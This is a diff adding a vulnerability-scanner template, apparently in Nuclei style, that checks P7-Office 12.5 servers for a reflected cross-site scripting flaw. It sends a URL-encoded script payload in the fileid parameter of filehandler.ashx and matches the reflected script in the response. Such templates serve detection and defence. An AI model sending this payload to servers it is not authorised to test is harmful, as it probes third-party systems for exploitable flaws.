@@ -1,0 +1,26 @@
+id: p7-office-xss
+name: Р7-Office 12.5 - Cross-Site Scripting
+severity: medium
+confidence: confirmed
+description: A failure to implement proper measures to protect the structure of the web page in the P7-Office corporate server
+  could have allowed a remote attacker to perform a cross-site scripting (XSS) attack.
+reference: https://bdu.fstec.ru/vul/2024-04635
+tags:
+- p7office
+- xss
+- vuln
+requests:
+- method: GET
+  path: /Products/Files/HttpHandlers/filehandler.ashx?action=thumb&fileid=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+  matchers:
+  - type: body
+    words:
+    - 'Can not convert id:'
+    - <script>alert(document.domain)</script>
+  - type: body
+    words:
+    - text/html
+  - type: status
+    status:
+    - 500
+  condition: and
